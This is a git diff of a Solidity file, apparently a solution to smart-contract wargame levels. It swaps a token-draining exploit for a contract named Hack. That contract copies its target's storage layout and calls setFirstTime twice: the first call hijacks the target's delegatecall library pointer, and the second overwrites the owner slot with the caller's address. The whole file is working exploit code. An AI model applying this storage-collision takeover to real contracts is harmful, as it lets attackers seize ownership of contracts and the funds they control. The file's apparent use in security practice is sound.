@@ -1,25 +1,28 @@
 // SPDX-License-Identifier: WTFPL
 pragma solidity 0.8.7;
 
-interface INaughtCoin {
-    function balanceOf(address account) external returns (uint256);
-
-    function transferFrom(
-        address _from,
-        address _to,
-        uint256 _value
-    ) external returns (bool success);
+interface IPreservation {
+    function setFirstTime(uint _timeStamp) external;
 }
 
 contract Hack {
-    INaughtCoin naught;
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint storedTime;
+
+    IPreservation public preservation;
 
     constructor(address contractAddress) {
-        naught = INaughtCoin(contractAddress);
+        preservation = IPreservation(contractAddress);
     }
 
     function attack() public {
-        uint256 balance = naught.balanceOf(msg.sender);
-        naught.transferFrom(msg.sender, address(this), balance);
+        preservation.setFirstTime(uint256(uint160(address(this))));
+        preservation.setFirstTime(uint256(uint160(msg.sender)));
+    }
+
+    function setTime(uint _time) public {
+        owner = address(uint160(_time));
     }
 }
